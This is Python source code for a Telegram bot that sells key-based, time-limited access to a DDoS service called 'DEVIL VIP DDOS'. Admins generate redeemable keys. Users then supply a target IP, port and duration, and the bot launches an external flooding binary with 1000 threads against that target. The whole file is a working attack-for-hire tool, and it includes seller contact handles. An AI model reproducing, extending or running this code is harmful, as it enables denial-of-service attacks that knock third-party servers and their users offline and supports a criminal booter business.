import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 1000
users = {}
keys = {}
def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}
def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)
def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}
def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))
def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗸𝗲𝘆\n {key}\n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆\n {expiration_date}\n\n𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔 𝘽𝙊𝙏 𝙇𝙄𝙆𝙀 --> \n/𝙧𝙚𝙙𝙚𝙚𝙢 𝙝𝙝𝙧𝙧𝙭𝙨𝙙"
            except ValueError:
                response = f"⚠️ 𝐸𝑅𝑅𝒪𝑅 ⚠️ DM --> @DEVILVIPDDOS"
        else:
            response = "⚠️ 𝐸𝑅𝑅𝒪𝑅 ⚠️ DM --> @DEVILVIPDDOS"
    else:
        response = f"⚠️ 𝐸𝑅𝑅𝒪𝑅 ⚠️ DM --> @DEVILVIPDDOS"

    await update.message.reply_text(response)
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ʜᴀꜱ ʙᴇᴇɴ ᴀᴄᴄᴇᴘᴛᴇᴅ ɴᴏᴡ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ \nᴋey ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ"
        else:
            response = f"⚠️ 𝐸𝑅𝑅𝒪𝑅 ⚠️ DM --> @DEVILVIPDDOS"
    else:
        response = f"⚠️ 𝐸𝑅𝑅𝒪𝑅 ⚠️ DM --> @DEVILVIPDDOS"

    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗯𝘆 𝗗𝗘𝗩𝗜𝗟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦🚩 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 [ @DEVILVIPDDOD ]")
        return

    if len(context.args) != 3:
        await update.message.reply_text('𝗧𝗔𝗥𝗚𝗘𝗧 𝗣𝗢𝗥𝗧 𝗧𝗜𝗠𝗘')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./PAPAS4', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'𝗔𝘁𝘁𝗮𝗰𝗸 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 🦸\n\n—͟͞͞★ᴛᴀʀɢᴇᴛ :- {target_ip}\nᖘ٥ŕԵ :- {port} \nꕶË₸ﾟ:- {duration}𝗌℮cõ𝑛𝚍\n𝗧𝗔𝗣 𝗧𝗢 𝗦𝗧𝗔𝗥𝗧 :- /start\n\n𝗗𝗘𝗩𝗜𝗟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 🚩')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("🚫 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 🚫 --> @VIP_DDoS_SELLER")
        return

    if flooding_process is not None:
        await update.message.reply_text('ʏᴏᴜ ᴀʀᴇ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʜᴀꜱ ʙᴇᴇɴ ᴘᴇɴᴅɪɴɢ')
        return

    if flooding_command is None:
        await update.message.reply_text('⚠️ 𝗘𝗥𝗥𝗢𝗥 ⚠️')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('♟️𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗♟️\nᴴᵉʸ ᴾʳⁱᵐⁱᵘᵐ ᵘˢᵉʳ🚩\n𝙵𝙳𝙱𝙺 - @DEVILVIPDDOS\n\n𝗧𝗮𝗽 𝗧𝗼 𝗦𝘁𝗼𝗽 - /stop\n\n 🚩')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("🚫 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 🚫 --> @DEVILVIPDDO")
        return

    if flooding_process is None:
        await update.message.reply_text('⚠️ 𝗘𝗥𝗥𝗢𝗥 ⚠️')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🛑 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🛑\n\nʏᴏᴜ ᴀʀᴇ ᴀᴛᴛᴀᴄᴋ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀɴᴏᴛʜᴇʀ ᴀᴛᴛᴀᴄᴋ \nʟɪᴋᴇ /ʙɢᴍɪ ᴛᴀʀɢᴇᴛ ᴘᴏʀᴛ ᴛɪᴍᴇ\nᴛᴀᴘ ᴛᴏ ᴀɢᴀɪɴ ꜱᴛᴀʀᴛ :- /start\n\n𝗗𝗘𝗩𝗜𝗟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 🚩')


def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("key", genkey))
    application.add_handler(CommandHandler("buy", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
 
    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
  
